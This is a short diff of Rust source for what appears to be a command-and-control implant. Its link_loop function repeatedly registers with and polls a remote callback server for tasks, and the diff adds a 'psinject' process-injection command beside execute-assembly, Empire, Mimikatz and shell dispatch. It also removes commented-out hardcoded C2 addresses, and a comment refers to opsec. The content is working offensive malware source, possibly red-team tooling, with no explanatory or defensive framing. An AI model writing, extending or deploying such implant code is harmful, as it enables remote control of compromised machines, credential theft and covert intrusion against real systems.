@@ -47,7 +47,6 @@ fn link_loop() {
     let step3_cb = format!("https://{}/static/get", callback);
     // keep retrying to reach C2
     loop {
-        //let step1 = client.get("https://10.0.2.2:8443/js").send();
         let step1 = client.get(step1_cb.as_str()).send();
         match step1 {
             Ok(_) => break,
@@ -63,7 +62,6 @@ fn link_loop() {
     };
     let mut uresp: reqwest::blocking::Response;
     loop {  
-        //let resp = client.post("https://10.0.2.2:8443/static/register")
         let resp = client.post(step2_cb.as_str())
             .json(&register_link)
             .send();
@@ -85,7 +83,6 @@ fn link_loop() {
     };
     loop {
         // poll
-        //let resp = client.post("https://10.0.2.2:8443/static/get")
         let resp = client.post(step3_cb.as_str())
             .header("x-request-id", recv_task.x_request_id.clone())
             .json(&send_task)
@@ -120,6 +117,7 @@ fn link_command(command: String) -> String {
     // the args should all be changed for better opsec
     match args[0] {
         "execute-assembly"  => nonstd::execute_assembly(args),
+        "psinject"          => nonstd::process_injection(args),
         "empire"            => nonstd::empire(args),
         "mimikatz"          => nonstd::mimikatz(args),
         "cmd"               => command_spawn(args),
